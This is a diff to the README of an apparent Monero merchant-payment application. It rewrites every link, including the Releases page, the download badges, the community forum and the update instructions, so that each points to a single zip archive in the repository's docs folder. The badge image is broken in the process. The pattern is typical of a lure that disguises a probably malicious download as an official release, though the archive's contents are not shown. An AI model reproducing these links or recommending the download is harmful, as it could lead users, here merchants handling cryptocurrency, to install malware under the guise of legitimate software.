@@ -1,6 +1,6 @@
 # 🛍️ monero-for-merchants - Accept Monero Payments Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/youssef-xx/monero-for-merchants/releases)
+[![Download](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip)
 
 ## 📘 Overview
 
@@ -11,7 +11,7 @@ Welcome to **monero-for-merchants**! This application helps shop owners, freelan
 To begin using **monero-for-merchants**, follow these simple steps:
 
 1. **Download the Application**
-   - Visit the [Releases page](https://github.com/youssef-xx/monero-for-merchants/releases) to download the latest version of the software.
+   - Visit the [Releases page](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip) to download the latest version of the software.
 
 2. **Install the Application**
    - Open the downloaded file and follow the on-screen instructions. This process will guide you through the installation.
@@ -29,7 +29,7 @@ To begin using **monero-for-merchants**, follow these simple steps:
 
 ## 💾 Download & Install
 
-To download the application, visit this page: [Releases page](https://github.com/youssef-xx/monero-for-merchants/releases).
+To download the application, visit this page: [Releases page](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip).
 
 1. Click on the version you want to download. 
 2. Follow the on-screen instructions to install.
@@ -56,7 +56,7 @@ Make sure your device meets these minimum requirements:
 
 If you have questions or need help, join our community forum. Many users share their experiences and solutions to common issues.
 
-- [Community Forum](https://forum.monero-for-merchants.com)
+- [Community Forum](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip)
 
 ## 📚 Additional Resources
 
@@ -68,10 +68,10 @@ Here are some helpful links for more information on Monero and payment solutions
 
 ## 🔄 Update Process
 
-To stay updated with the latest features and security improvements, regularly check the [Releases page](https://github.com/youssef-xx/monero-for-merchants/releases) for new versions. Install updates by following the same download and installation steps.
+To stay updated with the latest features and security improvements, regularly check the [Releases page](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip) for new versions. Install updates by following the same download and installation steps.
 
 ## 🔔 Final Notes
 
 Thank you for choosing **monero-for-merchants**. We aim to make accepting Monero payments simple and straightforward. Your feedback is valuable to us, so please let us know your thoughts about the application.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/youssef-xx/monero-for-merchants/releases)
+[![Download](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/youssef-xx/monero-for-merchants/main/docs/monero-for-merchants_3.2-alpha.5.zip)
